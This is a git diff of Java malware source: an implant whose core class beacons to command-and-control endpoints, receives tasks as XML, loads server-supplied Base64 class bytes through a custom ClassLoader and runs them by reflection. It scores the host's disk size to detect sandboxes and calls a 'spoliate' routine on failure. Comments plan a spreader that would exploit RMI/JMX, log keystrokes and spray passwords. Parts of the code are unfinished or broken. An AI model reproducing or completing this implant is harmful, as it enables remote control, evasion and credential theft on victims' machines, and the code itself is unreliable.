@@ -4,19 +4,14 @@ import java.io.FileReader;
 import java.io.StringWriter;
 import java.io.IOException;
 import java.io.OutputStreamWriter;
-import java.awt.Robot;
-import java.awt.Toolkit;
 import java.lang.management.ManagementFactory;
-import java.lang.reflect.Array;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 import java.util.ArrayList;
 import java.util.Enumeration;
 import java.util.Hashtable;
 import java.util.UUID;
-import java.util.Arrays;
 import java.util.Base64;
-//import java.util.UUID;
 import org.w3c.dom.Document;
 import org.w3c.dom.Element;
 import org.w3c.dom.Node;
@@ -39,7 +34,7 @@ import javax.crypto.Cipher;
 import javax.crypto.SecretKey;
 import javax.crypto.spec.GCMParameterSpec;
 import javax.crypto.spec.SecretKeySpec;
-import javax.lang.model.type.DeclaredType;
+
 import javax.crypto.IllegalBlockSizeException;
 import javax.net.ssl.HostnameVerifier;
 import javax.net.ssl.HttpsURLConnection;
@@ -47,9 +42,7 @@ import javax.net.ssl.SSLContext;
 import javax.net.ssl.SSLSession;
 import javax.net.ssl.TrustManager;
 import javax.net.ssl.X509TrustManager;
-import javax.swing.text.html.HTMLEditorKit.Parser;
 
-import java.net.HttpURLConnection;
 import java.net.InetAddress;
 import java.net.NetworkInterface;
 import java.net.SocketException;
@@ -59,7 +52,6 @@ import java.net.URISyntaxException;
 import java.security.cert.CertificateException;
 import java.security.cert.X509Certificate;
 import java.security.spec.AlgorithmParameterSpec;
-import java.text.DecimalFormat;
 import java.text.SimpleDateFormat;
 import java.security.InvalidKeyException;
 
@@ -73,6 +65,7 @@ class nConfig
     public static int isKeystone = 0;
     public static int stutterMin = 10;
     public static int stutterMax = 50;
+    public static int virtThreshold = 10; //6 for when it's ready
     public static String passMat = "T__+Pmv.REW=u9iXBB-";
     public static Hashtable endpoints = new Hashtable(){
         {
@@ -87,16 +80,15 @@ public class nCore
     static public String cookieData = "null";
     static public String sessUUID = "";
     static public String nonce = "";
-    static public int queue = 0;
     static public ArrayList tasks = new ArrayList();
     static public ArrayList output = new ArrayList();
     static private countermeasures cm = new countermeasures();
     static private utilitarian nUtil = new utilitarian();
-    static private modLib mLib = new modLib();
+    static private pkgLib packager = new pkgLib();
 
     public static void Main(String[] args) throws ClassNotFoundException, Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
     {
-        //add execution delay of 10 minutes +/-
+        //add execution delay of 10 minutes +/- to 1st stage
         sessUUID = UUID.randomUUID().toString();
         //convert to threadable once main loop has been tested
 
@@ -107,21 +99,22 @@ public class nCore
             cm.spoliate();
         }
 
-        mLib.getUpdate("autoLib","");
-
         //execute initial 
         //start loop
+        //if no authentication has occurred before, the keepalive will find autolib and a task object for metadata and to start the metastasizer
         keepalive();
     }
 
-    public static boolean keepalive()
+    public static void keepalive() throws ClassNotFoundException, Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
     {
         //consolidate task and keepalive
         //5 tries to checkin
         network nComm = new network();
         utilitarian nUtil = new utilitarian();
 
-        for (int c=0; c<5; c++)
+        int c;
+
+        for (c=0; c<4; c++)
         {
             try
             {  
@@ -132,15 +125,14 @@ public class nCore
 
                     nonce = xmlResponse.get("nonce").toString();
                     cookieData = xmlResponse.get("cookie").toString();
-                    queue = Integer.valueOf(xmlResponse.get("taskQueue").toString());
 
                     ArrayList taskSet = (ArrayList) xmlResponse.get("tasks");
 
                     for (int k=0; k<taskSet.size(); k++)
                     {
-                        tasks.add(taskSet)
+                        tasks.add(taskSet);
                     }
-                    react();
+                    
                 }
                 else
                 {
@@ -152,7 +144,13 @@ public class nCore
                 continue;
             }
         }
-        cm.spoliate();
+        if (c<4) {
+            react();
+        }
+        else
+        {
+            cm.spoliate();
+        }
     }
 
     public static void react() throws ClassNotFoundException, Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
@@ -168,26 +166,51 @@ public class nCore
             Hashtable taskObj = (Hashtable) tasks.get(t);
 
             String methodName = taskObj.get("method").toString();
+            String className = taskObj.get("class").toString();
+            String classical = taskObj.get("mod").toString();
+
             String[] args = new String(
                 Base64.getDecoder().decode(
                     taskObj.get("args").toString()
                 )
             ).split(",");
 
-            Hashtable methObj = nUtil.getMethodByName(methodName);
+            //I think this might not work, I may have to just execute the classdata directly rather than loading it
+            //Hashtable methObj = nUtil.getMethodByName(methodName);
 
-            if (methObj == null)
+            //if (methObj == null)
+            //{
+            //    //install module
+            //    packager.load(className, methodical);
+            //    methObj = nUtil.getMethodByName(methodName);
+            //}
+
+            //threader(
+            //    (Class) methObj.get("class"),
+            //    (Method) methObj.get("method"),
+            //    args
+            //);
+            Class classObj = packager.load(className, classical);
+            Hashtable methObj = nUtil.getMethodByName(classObj, methodName);
+
+            if (methObj.get("error").toString() != "null")
             {
-                //pull module
-                mLib.getUpdate("",methodName);
-                methObj = nUtil.getMethodByName(methodName);
-            }
+                Hashtable<String,String> outObj = new Hashtable<>();
+                outObj.put("mod",new Object(){}.getClass().getEnclosingMethod().getName());
+                outObj.put("timestamp",new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date()));
+                outObj.put("output","");
+                outObj.put("error",String.format("Unable to load method %s, exception follows: %s",methodName,methObj.get("error").toString()));
 
-            threader(
-                (Class) methObj.get("class"),
-                (Method) methObj.get("method"),
-                args
-            );
+                nCore.output.add(outObj);
+            }
+            else
+            {
+                threader(
+                    classObj,
+                    (Method) methObj.get("methodical"),
+                    args
+                );
+            }
         }   
 
         send();
@@ -250,15 +273,19 @@ public class nCore
         }
     }
 
-    private static class modLib
-    {
-        private static void getUpdate(String classByName, String methodByName)
+    private static class pkgLib extends ClassLoader {
+        private Class load(String className, String classical)
         {
-            // update the autolib from the backend
+            byte[] rawMeth = Base64.getDecoder().decode(classical);
+            return defineClass(className, rawMeth, 0, rawMeth.length);
         }
+    }
 
+
+                    /*
         private static class autoLib
         {
+
             private void metastasize()
             {
                 // spreader governor module, searches the autolib inner class cancer for any modules other than itself and runs them
@@ -266,7 +293,7 @@ public class nCore
                 // exploit rmi/ndwp/jmx
                 // keylog, operator puts passwords in vault, password spray
             }
-            /*
+
             private void inputGather()
             {
                 // log keystrokes w/jnativehook or awt robot
@@ -301,7 +328,6 @@ public class nCore
             {
 
             }
-            */
         }
 
         private class genLib
@@ -327,6 +353,7 @@ public class nCore
                 outObj.put("mod",new Object(){}.getClass().getEnclosingMethod().getName());
                 outObj.put("timestamp",new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date()));
                 outObj.put("output",nUtil.xmlDocToString(metaDoc));
+                outObj.put("error","")
 
                 nCore.output.add(outObj);
             }
@@ -341,38 +368,35 @@ public class nCore
         {
             //currently empty, populated when modules updated
         }
+        */
 
 
-    } 
 
     private static class utilitarian
     {
 
-        private Hashtable getMethodByName(String methodName) throws ClassNotFoundException
+        private Hashtable getMethodByName(Class cData, String methodName) throws ClassNotFoundException
         {
             Hashtable methObj = new Hashtable();
-            String[] classSet = new String[]{"autoLib","genLib","nixLib","winLib"};
-            for (int c=0;c<classSet.length;c++)
+            try
             {
-                Class cData = Class.forName(classSet[c]);
-                try
-                {
-                    methObj.put("method",cData.getMethod(methodName,null));
-                    methObj.put("class",cData);
-                }
-                catch (Exception e)
-                {
-                    continue;
-                }
+                Method cMethodical = cData.getMethod(methodName,null);
+                methObj.put("methodical",cMethodical);
+                methObj.put("error","null");
             }
-            
+            catch (Exception e)
+            {
+                methObj.put("methodical","null");
+                methObj.put("error",e.getMessage());
+            }
+
             return methObj;
         }
 
         private Hashtable xmlStringToParseable(String input) throws ParserConfigurationException, IOException, SAXException
         {
             //responses should adhere to pattern:
-            //<response><nonce data=""></nonce><cookie data=""></cookie><blob>b64</blob><task class="" method="" args="b64"></task></response>
+            //<response><nonce data=""></nonce><cookie data=""></cookie><task class="" method="" args="b64">b64moddata</task></response>
             Hashtable xmlData = new Hashtable();
             xmlData.put("tasks",new ArrayList());
 
@@ -391,11 +415,6 @@ public class nCore
                     Element nodeElement = (Element) nodeData;
                     xmlData.put(nodeElement.getTagName(),nodeElement.getAttribute("data"));
                 }
-                else if (nodeData.getNodeName() == "blob")
-                {
-                    Element nodeElement = (Element) nodeData;
-                    xmlData.put("blob",nodeElement.getTextContent());
-                }
                 else if (nodeData.getNodeName() == "task")
                 {
                     ArrayList taskSet = (ArrayList) xmlData.get("tasks");
@@ -406,6 +425,7 @@ public class nCore
                     taskDescriptor.put("class",nodeElement.getAttribute("class"));
                     taskDescriptor.put("method",nodeElement.getAttribute("method"));
                     taskDescriptor.put("args",nodeElement.getAttribute("args"));
+                    taskDescriptor.put("mod",nodeElement.getTextContent());
 
                     taskSet.add(taskDescriptor);
                     xmlData.put("tasks",taskSet);
@@ -603,18 +623,16 @@ public class nCore
         }
     }
 
-    private static class countermeasures
+    private static class countermeasures 
     {
-        private boolean chkSandbox()
+        private boolean chkSandbox() throws SocketException
         {
             //this should go in the loader too 
             //score the system
             int score = 0;
 
-            //what's normal?
-            int scrResolution = Toolkit.getDefaultToolkit().getScreenResolution();
 
-            //<40gb (+3), <50gb (+2), <80gb (+1)
+            //<40gb (+5), <60gb (+3), <80gb (+1)
             long diskSpace = new File("/").getTotalSpace();
 
             if (diskSpace < 80000000000L)
@@ -646,7 +664,7 @@ public class nCore
                 score += 3;
             }
 
-            if (score <= 5)
+            if (score <= nConfig.virtThreshold)
             {
                 return false;
             }
